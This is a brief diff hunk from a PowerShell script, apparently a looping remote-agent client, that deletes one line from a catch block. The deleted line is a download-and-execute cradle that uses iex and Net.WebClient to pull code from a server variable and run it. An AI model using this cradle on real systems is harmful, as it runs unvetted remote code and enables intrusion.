@@ -202,7 +202,7 @@ while ($true) {
 					}
 					catch [System.Exception]
 					{
-						iex (New-Object Net.WebClient).DownloadString("http://'+$Server+'/insecureConnect")
+						
 					}
 		'
 
